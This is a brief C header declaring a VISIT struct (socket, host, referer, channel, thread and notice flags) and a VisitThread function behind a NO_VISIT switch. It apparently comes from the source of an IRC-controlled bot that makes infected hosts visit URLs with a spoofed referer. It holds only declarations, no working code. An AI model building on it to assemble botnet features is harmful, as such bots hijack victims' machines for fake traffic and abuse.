#ifndef NO_VISIT
typedef struct VISIT
{
	 SOCKET sock;
	 char host[MAXHOSTNAME];
	 char referer[MAXURLLEN];
	 char chan[MAXCHANLEN];
	 int threadnum;
	 BOOL silent;
	 BOOL notice;
	 BOOL gotinfo;

} VISIT;

DWORD WINAPI VisitThread(LPVOID param);
#endif
